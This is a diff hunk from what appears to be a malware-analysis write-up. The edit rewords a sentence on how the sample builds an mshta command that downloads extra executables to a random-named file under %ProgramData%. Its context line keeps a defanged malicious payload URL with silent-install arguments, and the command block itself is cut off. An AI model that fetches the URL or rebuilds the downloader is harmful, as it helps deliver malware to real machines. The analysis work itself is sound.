@@ -72,7 +72,7 @@ hxxps://setup.maskvpn[.]cc/g.asp?id=151 - Args: /silent /subid=603
 ![Entry Point]({{site.url}}/{{site.baseurl}}/images/main.png)
 *Main Function*
 
-For each payload URL, it constructs the following command to download additional files from the download URL to **%ProgramData%\<random_string>.exe**.
+For each payload URL, it constructs the following command to download additional files to `%ProgramData%\<random_string>.exe`.
 
 <b>mshta command</b>
 ```powershell
